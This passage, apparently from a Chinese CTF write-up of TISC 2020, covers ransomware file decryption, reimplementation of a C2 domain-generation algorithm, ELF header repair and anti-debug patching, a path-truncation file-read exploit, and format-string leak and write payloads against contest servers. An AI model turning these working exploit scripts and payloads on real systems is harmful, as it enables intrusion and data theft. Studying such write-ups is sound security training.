KEY = bytes.fromhex('997a11127f6a442293d2a8eb1d327504')

def main():
    filename = sys.argv[1]
    output = sys.argv[2]
    data = open(filename, 'rb').read()
    base = os.path.basename(filename)
    new_iv = base[:2].encode('utf-8') + IV[2:]

    cipher = AES.new(KEY, AES.MODE_CTR, initial_value=new_iv, nonce=b'')
    mt_bytes = cipher.decrypt(data)
    open(output, 'wb').write(mt_bytes)

if __name__ == '__main__':
    main()
```

最终在解密后的数据库中找到flag:

```
r10@kali:~/tisc$ python decrypt_anoroc.py ./encrypted/secret_investments.db.anoroc decrypted/secret_investments.db
r10@kali:~/tisc$ sqlite3 decrypted/secret_investments.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite&gt; .schema
CREATE TABLE IF NOT EXISTS "stocks" (
    "id"    INTEGER NOT NULL UNIQUE,
    "symbol"    TEXT,
    "shares_held"    INTEGER,
    "target"    INTEGER,
    PRIMARY KEY("id" AUTOINCREMENT)
);
CREATE TABLE sqlite_sequence(name,seq);
CREATE TABLE IF NOT EXISTS "ctf_flag" (
    "id"    INTEGER NOT NULL UNIQUE,
    "comp"    TEXT,
    "flag"    TEXT,
    PRIMARY KEY("id" AUTOINCREMENT)
);

sqlite&gt; select * from ctf_flag;
1|TSIC20|TISC20`{`u_decrypted_d4_fil3s_w0w_82161874619846`}`
```

**Flag:** `TISC20`{`u_decrypted_d4_fil3s_w0w_82161874619846`}``



## STAGE 4: Where is the C2?

连接服务器得到提示：

```
$$$$$$$$\ $$$$$$\  $$$$$$\   $$$$$$\
\__$$  __|\_$$  _|$$  __$$\ $$  __$$\
   $$ |     $$ |  $$ /  \__|$$ /  \__|
   $$ |     $$ |  \$$$$$$\  $$ |
   $$ |     $$ |   \____$$\ $$ |
   $$ |     $$ |  $$\   $$ |$$ |  $$\
   $$ |   $$$$$$\ \$$$$$$  |\$$$$$$  |
   \__|   \______| \______/  \______/

CSIT's The Infosecurity Challenge 2020
https://play.tisc.csit-events.sg/

CHALLENGE 4: WHERE IS THE C2?
======================================

SUBMISSION_TOKEN? LdWaGOgyfbVQromGEgmzfADJYNpGEPKLUgjiudRJfMoKzpXyklQgNqSxSQeNYGsr
Where (domain name) can we find the ransomware servers on 2054-03-21T16:19:03.000Z?
```

在Stage 3中我们分析得到`main.QbznvaAnzrTrarengvbaNytbevguz`函数生成了C2域名。对该函数进行进一步分析，发现它在端点`https://worldtimeapi.org/api/timezone/Etc/UTC.json`获取一个JOSN数据并进行编码：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011022c020d8200bcb.jpg)

该端点返回一堆与时区有关的值：

```
`{`
   "abbreviation":"UTC",
   "client_ip":"&lt;IP ADDRESS&gt;",
   "datetime":"2020-09-17T21:29:49.031611+00:00",
   "day_of_week":1,
   "day_of_year":251,
   "dst":false,
   "dst_from":null,
   "dst_offset":0,
   "dst_until":null,
   "raw_offset":0,
   "timezone":"Etc/UTC",
   "unixtime":1599506733,
   "utc_datetime":"2020-09-17T21:29:49.031611+00:00",
   "utc_offset":"+00:00",
   "week_number":38
`}`
```

为了更好分析，这里将端点地址改为本地`localhost`:

[![](https://p2.ssl.qhimg.com/t01a3ad741f910c8987.jpg)](https://p2.ssl.qhimg.com/t01a3ad741f910c8987.jpg)

首先，`time.now()`获取当前系统的时间：

[![](https://p5.ssl.qhimg.com/t01085ecd7374b6ff8d.jpg)](https://p5.ssl.qhimg.com/t01085ecd7374b6ff8d.jpg)

然后，JOSN数据中的`unixtime`字段被获取：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t019c53241ab1eae5e9.jpg)

随后生成一个随机种子、一个代表域名可变长度的的随机数`ath/rand.(*Rand).Intn(0x20)`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01a23a9fde4c51a16e.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01035cbe7dd1a848ba.jpg)

这个可变长度值被加入到`0x20`值中组成基本域名的长度：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t012c6000dc956da53b.jpg)

当不满足终止条件时，再计算一个随机值`math/rand.(*Rand).Intn(0x539) % 0x24`最为字符数字`charset`的索引，并添加到结果域名的字符串中。这里，`charset`为`kod4y6tgirhzq1pva52jem3sfxw8u9b0ncl7`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a0d2df27e14dae7d.jpg)

当满足终止条件时，计算域名的根和前缀：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013c002714b77dfa9f.jpg)

这里有9中不同的根域的可能性：`.catbox.moe` `.cf` `.ga` `.gq` `.mixtape.moe` `.ml` `.nyaa.net` `.tk` `.pomf.io` 。<br>
编写一个go程序`test_random.go`来计算所需的域名:

```
package main

import (
    "fmt"
    "bytes"
    "os"
    "strconv"
    "math/rand"
)

func main() `{`

    charset := "kod4y6tgirhzq1pva52jem3sfxw8u9b0ncl7"
    epoch, _ := strconv.Atoi(os.Args[1])
    seed := int64(epoch &gt;&gt; 0xf)

    rand.Seed(seed)

    lengthener := rand.Intn(0x20)

    buff := bytes.NewBufferString("")

    for i := 0; i &lt; (0x20 + lengthener); i++ `{`
        current_num := rand.Intn(0x539 + i)
        current_num = current_num % 0x24
        //fmt.Println(current_num)
        buff.WriteByte(charset[current_num])
    `}`

    root_part := rand.Intn(0x7a69) % 9
    //fmt.Println(root_part)
    parts := [...]string`{`".mixtape.moe", ".catbox.moe", ".tk", ".nyaa.net", ".gq", ".pomf.io",
    ".cf", ".ga", ".ml"`}`
    //fmt.Println(root_part)

    buff.WriteString(parts[root_part])

    domain := buff.String()

    fmt.Println(domain)
`}`
```

随后编写python脚本`solver.py`进行问题的解决：

```
from pwn import *
from datetime import datetime
import pytz

def get_answer(epoch):
    p = process("./test_random `{``}`".format(epoch), shell=True)

    domain = p.recvall().strip()
    p.close()
    return domain

def main():
    p = remote("fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg", 31090)
    p.recvuntil("SUBMISSION_TOKEN?")
    p.sendline("exIvQfhiaBKjudkvmWrIUoAheGZEjscdPOJClxUJNTFdJbFiguftOlVacIkgQRYG")

    while True:
        test_win = p.recvuntil(["Do you know the domain name at ", "Winner"])
        if b"Winner" in test_win:
            print(p.recvall(0.5))
            return
        timing = p.recvuntil("Coordinated Universal Time")
        timing = timing.replace(b" Coordinated Universal Time", b"")
        p.recvuntil("connects to?")

        parsed_d = datetime.strptime(timing.decode("utf-8"), "%B %d, %Y, %I:%M:%S %p")
        parsed_d = pytz.utc.localize(parsed_d)
        epoch = int(parsed_d.timestamp())
        answer = get_answer(epoch)
        p.sendline(answer)
        print(answer)


    p.interactive()


if __name__ == '__main__':
    main()
```

运行脚本解决该题目：

```
r10@kali:~/tisc$ python solver.py
[+] Opening connection to fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg on port 31090: Done
[+] Starting local process '/bin/sh': pid 18545
[+] Receiving all data: Done (49B)
[*] Process '/bin/sh' stopped with exit code 0 (pid 18545)
b'ctoi9uj4lt0grfqozyqh0smh6do1onaqf35vj8fg81b8c.cf'
[+] Starting local process '/bin/sh': pid 18546
[+] Receiving all data: Done (50B)
[*] Process '/bin/sh' stopped with exit code 0 (pid 18546)
b'evp92cfszcejb3ac0t5o0sn7zb3z2nf89zztftu1kxt7nb.ga'
[+] Starting local process '/bin/sh': pid 18547
[+] Receiving all data: Done (56B)
[*] Process '/bin/sh' stopped with exit code 0 (pid 18547)
b'nhiz9blh6n1tut9s4w5mbk3lyh6vur80cvf2k6ttee3u.catbox.moe'
[+] Starting local process '/bin/sh': pid 18548
[+] Receiving all data: Done (47B)
[*] Process '/bin/sh' stopped with exit code 0 (pid 18548)
b'2yuowtvj496xbdeu9omxrb86qfb4x3ttula7s.nyaa.net'
...
[+] Starting local process '/bin/sh': pid 18644
[+] Receiving all data: Done (40B)
[*] Process '/bin/sh' stopped with exit code 0 (pid 18644)
b'4zfb2qiyyvti9oikcqcanmivzdn5da2lyf76.ml'
[+] Receiving all data: Done (87B)
[*] Closed connection to fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg port 31090
b' Winner Vegan Dinner...'
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01378475eb77d5c696.jpg)

**Flag:** `无显示，自动提交`



## STAGE 5: Bulletin Board System

这一题提供了一个二进制文件`bbs`:

```
r10@kali:~/tisc$ file bbs
bbs: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), too many section (65535)
```

对`bbs`文件进行调试：

```
r10@kali:~/tisc$ gdb ./bbs
GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
...
"/stage5/./bbs": not in executable format: File truncated

gef&gt;  r
Starting program:
No executable file specified.
Use the "file" or "exec-file" command.
```

检查文件头，发现头被打乱：

```
r10@kali:~/tisc$ readelf -h bbs
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 03 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - GNU
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x400a60
  Start of program headers:          64 (bytes into file)
  Start of section headers:          65535 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         6
  Size of section headers:           64 (bytes)
  Number of section headers:         65535
  Section header string table index: 65535 (3539421402)
readelf: Error: Reading 4194240 bytes extends past end of file for section headers
```

参考了[这篇文章的分析](https://binaryresearch.github.io/2020/01/15/Analyzing-ELF-Binaries-with-Malformed-Headers-Part-3-Solving-A-Corrupted-Keygenme.html)，这里应该使用了[ ELF Screwer tool ](https://dustri.org/b/screwing-elf-header-for-fun-and-profit.html)来破坏头中的`e_shoff` `e_shnum` `e_shstrndx`字段值。为了修复进调试，编写修复脚本,生成修复后的文件`repaired_bbs`:

```
#!/usr/bin/python3

from lepton import *
from struct import pack

def main():
    with open("../bbs", "rb") as f:
        elf_file = ELFFile(f)

    # overwrite fields values with 0x00 bytes
    elf_file.ELF_header.fields["e_shoff"] = pack("&lt;Q", 0)
    elf_file.ELF_header.fields["e_shentsize"] = pack("&lt;H", 0)
    elf_file.ELF_header.fields["e_shnum"] = pack("&lt;H", 0)
    elf_file.ELF_header.fields["e_shstrndx"] = pack("&lt;H", 0)

    # output to file
    binary = elf_file.ELF_header.to_bytes() + elf_file.file_buffer[64:]
    with open("../repaired_bbs", "wb") as f:
        f.write(binary)


if __name__=="__main__":
    main()
```

对`repaired_bbs`进行调试：

```
r10@kali:~/tisc$ gdb ./repaired_bbs
GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
...
Reading symbols from ./repaired_bbs...(no debugging symbols found)...done.
gef&gt;  r
Starting program: /vagrant/ctfs/tisc/stage5/repaired_bbs
[Inferior 1 (process 15994) exited normally]
```

但是文件依然没有执行成功，而是直接退出。检查`strace`，看看是否存在反调试机制：

```
r10@kali:~/tisc$ strace -f ./repaired_bbs
execve("./repaired_bbs", ["./repaired_bbs"], 0x7ffdae1cba08 /* 27 vars */) = 0
brk(NULL)                               = 0x2185000
brk(0x21861c0)                          = 0x21861c0
arch_prctl(ARCH_SET_FS, 0x2185880)      = 0
uname(`{`sysname="Linux", nodename="kali", ...`}`) = 0
readlink("/proc/self/exe", "/stage5/repair"..., 4096) = 38
brk(0x21a71c0)                          = 0x21a71c0
brk(0x21a8000)                          = 0x21a8000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
ptrace(PTRACE_TRACEME)                  = -1 EPERM (Operation not permitted)
exit_group(0)                           = ?
+++ exited with 0 +++
```

寻找`patrace`调用：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0152f6fe04209a5f33.jpg)

使用NOPs，得到`patched_bbs`，然后就能进行调试和执行了：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01fe244cb83d621a14.jpg)

```
gef&gt; r
██████   █████  ██      ██ ███    ██ ██████  ██████   ██████  ███    ███ ███████
██   ██ ██   ██ ██      ██ ████   ██ ██   ██ ██   ██ ██    ██ ████  ████ ██     
██████  ███████ ██      ██ ██ ██  ██ ██   ██ ██████  ██    ██ ██ ████ ██ █████ 
██      ██   ██ ██      ██ ██  ██ ██ ██   ██ ██   ██ ██    ██ ██  ██  ██ ██    
██      ██   ██ ███████ ██ ██   ████ ██████  ██   ██  ██████  ██      ██ ███████

▚▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▞

              ██████  ██████  ███████     ██████  ██████   ██████ 
              ██   ██ ██   ██ ██          ██   ██ ██   ██ ██    ██
              ██████  ██████  ███████     ██████  ██████  ██    ██
              ██   ██ ██   ██      ██     ██      ██   ██ ██    ██
              ██████  ██████  ███████     ██      ██   ██  ██████

                               Version 0.1.7 (Alpha)
▗▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▖
▘                                                                                                                                     ▝
USERNAME:
```

尝试登录系统，如果输入错误的账号密码，提示我们用`gust`账户：

```
USERNAME: test
PASSWORD: test
Sorry, user accounts will only be available in the Beta.
Use account 'guest' with the password provided at the back of your BBS PRO CD Case!
```

在认证过程中，输入账号密码后，程序流转至`check_password`函数，检查密码是否最多为`0x19`字节：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a72be60cf5b0fe26.jpg)

对于每个字节，检查是奇数或者偶数索引。如果是偶数索引，取当前密码后4bits并存储，如果是奇数索引,则取前4bits与已经存储的bits合并，生成字节保存为最终构造的密码的一部分，最后与内存中的一个静态值`\x03\x13\x66\x23\x43\x66\x26\x16\x16\x23\x86\x36`比较：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t019df233daf3775a90.jpg)

为了生成有效的密码，编写脚本：

```
#!/usr/bin/python


def main():
    key = b"\x03\x13\x66\x23\x43\x66\x26\x16\x16\x23\x86\x36"
    password = b''
    for i in key:
        upper = i &gt;&gt; 4
        lower = i &amp; 0xf
        complete = chr((lower &lt;&lt; 4) + upper).encode("ascii") * 2
        password += complete
    print("Password: `{``}`".format(password.decode("ascii")))


if __name__ == '__main__':
    main()
```

得到gust的密码`0011ff2244ffbbaaaa22hhcc`后,成功登陆系统：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0108476864999b5c3d.jpg)

经过分析，`View Thread`能让我们任意读取系统上的文件。为了读取到`~/.passwd`，使用`starce`运行程序：

```
r10@kali:~/tisc$ cat credentials
guest
0011ff2244ffbbaaaa22hhcc

r10@kali:~/tisc$ ((cat data; cat -) | strace ./patched_bbs )
execve("./patched_bbs", ["./patched_bbs"], 0x7fffd92a33d0 /* 27 vars */) = 0
brk(NULL)                               = 0x16d2000
brk(0x16d31c0)                          = 0x16d31c0
arch_prctl(ARCH_SET_FS, 0x16d2880)      = 0
uname(`{`sysname="Linux", nodename="kali", ...`}`) = 0
readlink("/proc/self/exe", "/stage5/patched"..., 4096) = 46
brk(0x16f41c0)                          = 0x16f41c0
brk(0x16f5000)                          = 0x16f5000
...
write(1, "SELECT: ", 8SELECT: )                 = 8
write(1, "\33[0m", 4)                   = 4
read(0, V
"V", 1)                         = 1
read(0, "\n", 1)                        = 1
write(1, "\33[0;33m", 7)                = 7
...
write(1, "THREAD: ", 8THREAD: )                 = 8
write(1, "\33[0m", 4)                   = 4
read(0, hello_word
"h", 1)                         = 1
read(0, "e", 1)                         = 1
read(0, "l", 1)                         = 1
read(0, "l", 1)                         = 1
read(0, "o", 1)                         = 1
read(0, "_", 1)                         = 1
read(0, "w", 1)                         = 1
read(0, "o", 1)                         = 1
read(0, "r", 1)                         = 1
read(0, "d", 1)                         = 1
read(0, "\n", 1)                        = 1
access("/home/bbs/threads/hello_word.thr", F_OK) = -1 ENOENT (No such file or directory)
write(1, "\33[2J\33[H", 7
)              = 7
write(1, "\33[1;31m", 7)                = 7
write(1, "Thread does not exist! Press ent"..., 50Thread does not exist! Press enter to continue...
) = 50
write(1, "\33[0m", 4)                   = 4
read(0,
```

这里我们可以控制文件名，为了绕过`.thr`，尝试用长文件名，显示路径被截断：

```
access("/home/bbs/threads/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAA", F_OK) = -1 ENOENT (No such file or directory)
```

有了这个思路，编写完整脚本`exploit.py`，执行得到falg：

```
#!/usr/bin/python

from pwn import *


def main():
    p = remote('fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg', 12123)
    p.recvuntil("USERNAME: \33[0m")
    p.sendline("guest")
    p.recvuntil("PASSWORD: \33[0m")
    p.sendline("0011ff2244ffbbaaaa22hhcc")

    # Path Truncation Attack
    length = 254
    pathing = b'/home/bbs/threads/'
    prefix = b'../'
    back_part = b'/.passwd'
    slashes = b'/' * (length - len(pathing) - len(back_part) - len(prefix))
    payload = prefix + slashes + back_part

    # SELECT prompt
    p.recvuntil("SELECT: \33[0m")
    p.sendline("V")

    # Send the path
    p.recvuntil("THREAD: \33[0m")
    p.sendline(payload)

    # Get the flag.
    p.recvuntil('\x1b[H')
    flag = p.recvline()
    log.success("Flag: %s" % flag.decode("utf-8"))


if __name__ == '__main__':
    main()
```

```
python exploit.py
[+] Opening connection to fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg on port 12123: Done
[+] Flag: TISC20`{`m4ngl3d_b4ngl3d_wr4ngl3d`}`
```

**Flag:** `TISC20`{`m4ngl3d_b4ngl3d_wr4ngl3d`}``



## STAGE 6: Blind Boss Battle

连接服务器，可以发现存在字符串漏洞：

```
r10@kali:~/tisc$ nc fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg 42000
Welcome to Anoroc Riga Server

  Key-Value Storage Service

==============================

Number of users pwned today: 5908
Function Not Yet Implemented

AAAA
AAAA
%p %p %p %p %p %p %p
0x7fe685d08a03 (nil) 0x7fe685d08980 0x55f90fc8d0a0 (nil) 0x7fff2fc20690 0x55f90fc8a2e0
```

但当使用以下payload时，并没有发现`AAAAABBBBB`出现在堆栈泄露中：

```
AAAAABBBBA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
AAAABBBB.0x7f8ea2940a03.(nil).0x7f8ea2940980.0x5647b7e9d0a0.(nil).0x7ffcea9d97d0.0x5647b7e9a2e0.(nil).0x7f8ea277c0b3.0x7f8ea2979620.0x7ffcea9d97d8.0x100000000.0x5647b7e9a100.0x5647b7e9a2e0.0x23f94e9d138646bf.0x5647b7e9a1f0.0x7ffcea9d97d0.(nil).(nil).0xdc009ba63e6646bf.0xdce40a72934846bf.(nil).(nil).(nil).0x1.0x7ffcea9d97d8.0x7ffcea9d97e8.0x7f8ea297b190.(nil).(nil).0x5647b7e9a1f0.0x7ffcea9d97d0.(nil).(nil).0x5647b7e9a21e.0x7ffcea9d97c8.0x1c.0x1.0x7ffcea9daf5c.(nil).0x7ffcea9daf61.0x7ffcea9dafa3.
```

这说明我们控制的缓冲区在堆里或者其他可写的内存中。为了寻找线索，编写脚本获取更多的输出：

```
#!/usr/bin/python

from pwn import *

context.update(arch = 'amd64', os = 'linux')


def run_leak(p, payload):
    prefix = b"XXXX"
    total = prefix + payload
    p.sendline(total)
    p.recvuntil(prefix)
    data = p.recv()
    return data


def leak_str(p, index):
    payload = ('AAAA' + '%' + str(index) + '$s %' + str(index) + '$p' + 'CCCC').encode('utf-8')
    r = run_leak(p, payload)
    string = r[4:-4]
    return string

def main():
    for i in range(100):
        p = remote('fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg', 42000)
        try:
            leaked_string = leak_str(p, i)
            first_part = leaked_string.split(b' 0x')[0][:8].ljust(8, b'\x00')
            address_maybe = u64(first_part)
            status = b"%s 0x%x %d" % (leaked_string, address_maybe, i)
            print(status)
        except:
            pass
        else:
            p.close()

if __name__ == '__main__':
    main()
```

得到一堆输出：

```
b'%0$s %0$p 0x2430252073243025 0'
b'\n 0x7fb9d66f6a03 0xa 1'
b'(null) (nil) 0x2820296c6c756e28 2'
b'\x8b \xad\xfb 0x7fe571c13980 0xfbad208b 3'
b'XXXXAAAA%4$s %4$pCCCC 0x5633c36260a0 0x4141414158585858 4'
b'(null) (nil) 0x2820296c6c756e28 5'
b'\x01 0x7ffe5903f370 0x1 6'
b'\xf3\x0f\x1e\xfaAWL\x8d=\xa3* 0x56177ef4f2e0 0x8d4c5741fa1e0ff3 7'
b'(null) (nil) 0x2820296c6c756e28 8'
b'\x89\xc7\xe8\x06+\x02 0x7f11930d60b3 0x22b06e8c789 9'
b' 0x7f896fe78620 0x0 10'
b'\\\xefc\xbc\xfd\x7f 0x7ffdbc63d238 0x7ffdbc63ef5c 11'
b'\xf3\x0f\x1e\xfaU1\xf6H\x8d-\x92/ 0x5648c11c5100 0x48f63155fa1e0ff3 13'
b'\xf3\x0f\x1e\xfaAWL\x8d=\xa3* 0x55d52ec162e0 0x8d4c5741fa1e0ff3 14'
b'\xf3\x0f\x1e\xfa1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTL\x8d\x05F\x01 0x55b5aed8e1f0 0x8949ed31fa1e0ff3 16'
b'\x01 0x7ffd3f6b8330 0x1 17'
b'(null) (nil) 0x2820296c6c756e28 18'
b'(null) (nil) 0x2820296c6c756e28 19'
b'(null) (nil) 0x2820296c6c756e28 22'
b'(null) (nil) 0x2820296c6c756e28 23'
b'(null) (nil) 0x2820296c6c756e28 24'
b'\\o-\xf3\xfc\x7f 0x7ffcf32d4ef8 0x7ffcf32d6f5c 26'
b'a/\x8c8\xfe\x7f 0x7ffe388c13b8 0x7ffe388c2f61 27'
b' 0x7f4448906190 0x0 28'
b'(null) (nil) 0x2820296c6c756e28 29'
b'(null) (nil) 0x2820296c6c756e28 30'
b'\xf3\x0f\x1e\xfa1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTL\x8d\x05F\x01 0x5628217c51f0 0x8949ed31fa1e0ff3 31'
b'\x01 0x7ffc902d7a70 0x1 32'
b'(null) (nil) 0x2820296c6c756e28 33'
b'(null) (nil) 0x2820296c6c756e28 34'
b'\xf4\x90H\x8d=). 0x560a948af21e 0x2e293d8d4890f4 35'
b'\x1c 0x7fff0fb76318 0x1c 36'
b'pwn6 0x7ffdf4d72f5c 0x366e7770 39'
b'(null) (nil) 0x2820296c6c756e28 40'
b'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 0x7ffdd55a4f61 0x73752f3d48544150 41'
b'HOSTNAME=70e208321dbb 0x7ffd95f00fa3 0x454d414e54534f48 42'
b'user=pwn6 0x7fffabdc8fb9 0x6e77703d72657375 43'
b'HOME=/home/pwn6 0x7ffd44407fc3 0x6f682f3d454d4f48 44'
b'REMOTE_HOST=10.0.0.3 0x7ffea9b30fd3 0x485f45544f4d4552 45'
b'(null) (nil) 0x2820296c6c756e28 46'
b'\x7fELF\x02\x01\x01 0x7ffe8beb9000 0x10102464c457f 48'
b'\x06 0x5608a1023040 0x6 56'
b'\x7fELF\x02\x01\x01 0x7f224ba9c000 0x10102464c457f 62'
b'(null) (nil) 0x2820296c6c756e28 64'
b'\xf3\x0f\x1e\xfa1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTL\x8d\x05F\x01 0x55dec82f61f0 0x8949ed31fa1e0ff3 66'
b'(null) (nil) 0x2820296c6c756e28 76'
b'\xf5I\xa3n&lt;\x86\xd6\x13\xbb\xa9$\xdf6\xd5\x86\xddx86_64 0x7ffe30e7adb9 0x13d6863c6ea349f5 78'
b'(null) (nil) 0x2820296c6c756e28 80'
b'/home/pwn6/pwn6 0x7ffed176ffe8 0x77702f656d6f682f 82'
b'x86_64 0x7ffd8dd10819 0x34365f363878 84'
```

为了让程序泄露出更多的信息，我们需要一个任意指针并开始泄漏数据。下面的脚本中，`run_leak(p, b'%57001c%26$n')`一行，可以将`0xdead`值写入到堆栈的索引中。

```
#!/usr/bin/python

from pwn import *

context.update(arch = 'amd64', os = 'linux')


def run_leak(p, payload):
    prefix = b"XXXX"
    total = prefix + payload
    p.sendline(total)
    p.recvuntil(prefix)
    data = p.recv()
    return data


def leak_str(p, windex, index):
    payload = ('AAAA' + '%' + str(index) + '$p' + 'CCCC').encode('utf-8')
    r = run_leak(p, payload)
    string = r[4:-4]
    return string

def main():
    p = remote('fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg', 42000)
    baseline = []
    i = 17
    run_leak(p, b'%57001c%26$n')
    for j in range(1, 100):
        leaked_string = leak_str(p, i, j)
        if b'nil' in leaked_string or b'$' in leaked_string:
            pointer = 0
        else:
            pointer = int(leaked_string, 16)
        baseline.append(pointer)

    for i in range(len(baseline)):
        print("%-3d 0x%x" % (i+1, baseline[i]))

if __name__ == '__main__':
    main()
```

